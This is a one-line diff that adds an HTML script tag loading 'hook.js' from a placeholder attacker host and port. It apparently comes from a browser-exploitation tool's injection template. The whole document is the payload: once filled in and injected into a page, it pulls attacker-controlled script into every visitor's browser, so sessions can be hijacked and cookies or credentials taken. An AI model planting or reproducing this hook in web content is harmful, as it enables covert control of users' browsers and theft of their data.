@@ -1,0 +1,1 @@
+<script src="http://~bip~:~bport~/hook.js"></script>
